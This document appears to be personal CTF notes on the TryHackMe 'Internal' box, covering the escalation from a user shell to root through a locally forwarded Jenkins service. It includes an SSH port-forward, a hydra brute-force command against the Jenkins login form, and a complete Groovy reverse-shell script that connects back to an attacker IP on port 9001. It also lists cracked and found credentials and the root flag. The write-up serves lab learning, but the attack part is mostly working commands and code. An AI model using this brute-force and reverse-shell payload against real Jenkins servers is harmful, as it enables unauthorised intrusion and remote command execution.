in the home folder it says there is a jenkins service running on port 8080 
 
 ![[Pasted image 20210529165550.png]]
 
 port forwarding via ssh
 ![[Pasted image 20210529165740.png]]
 
 jenkins website
 ![[Pasted image 20210529170015.png]]
 
 and not a single cred works
 

 bruteforcing with admin
 
(change the port from 8080 for burpsuite to work `ssh -L 80:127.0.0.1:8080 aubreanna@internal.thm`)
 
 ![[Pasted image 20210529170558.png]]
 
`j_username=admin&j_password=admin&from=%2F&Submit=Sign+in`
 
 `hydra -l admin -P /usr/share/wordlists/rockyou.txt 127.0.0.1 http-post-form "/j_acegi_security_check:j_username=^USER^&j_password=^PASS^&from=%2F&Submit=Sign+in:Invalid username or password"`
 
 ![[Pasted image 20210529171430.png]]
 
 and we got a hit
 
`admin:spongebob`


 and we are in 
 ![[Pasted image 20210529171616.png]]
 
and from manage http://127.0.0.1/manage we can exectute a groovy script and get shell 

![[Pasted image 20210529171843.png]]

from here we get the script 
https://github.com/gquere/pwn_jenkins

```
String host="10.17.4.208";
int port=9001;
String cmd="/bin/bash";Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

listen and run 
![[Pasted image 20210529172203.png]]

and we got shell as jenkins

![[Pasted image 20210529172431.png]]

and then enumrating the docker container we got the creds from the /opt/note.txt

![[Pasted image 20210529172558.png]]

`root:tr0ub13guM!@#123`

ssh

![[Pasted image 20210529172718.png]]

root == THM{d0ck3r_d3str0y3r}